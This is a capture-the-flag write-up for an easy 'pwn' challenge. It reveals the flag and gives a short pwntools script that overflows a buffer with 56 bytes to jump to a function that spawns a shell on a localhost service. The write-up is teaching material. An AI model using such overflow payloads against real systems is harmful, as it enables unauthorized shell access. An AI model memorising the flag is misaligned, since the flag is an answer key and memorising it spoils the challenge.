# Gets me some treasure

## Description 
Our treasure has been stolen by a rival gang, can you get past their guard to steal it back?

**Category: pwn** 

**Difficulty: easy**

**Author: Darkflame72** 

**Flag: AHOY{y0u_f0und_tr3asure}**


## Exploit
With the local copy of the executable we can run it in gdb to see what happens. We can use gdb to get the offset from the crash when we run a buffer overflow attack.

Using the offset we can call the function to get a shell by manualy calling the `pirates_control` function. An example of how this is work is shown below.

#TODO show the gdb bit on a linux machine

```py
from pwn import *

# Load information about the binary
elf = ELF("./treasure")

# Connect to the remote host, in this case it's just localhost:1337
p = remote("localhost", 1337)

# 56 'A's followed by the address of `pirates_control`
payload = b"A"*56 + p64(elf.sym["pirates_control"])

# Receive the text from the program, and send the payload
p.recv()
p.sendline(payload)

# Get an interactive shell
p.interactive()
```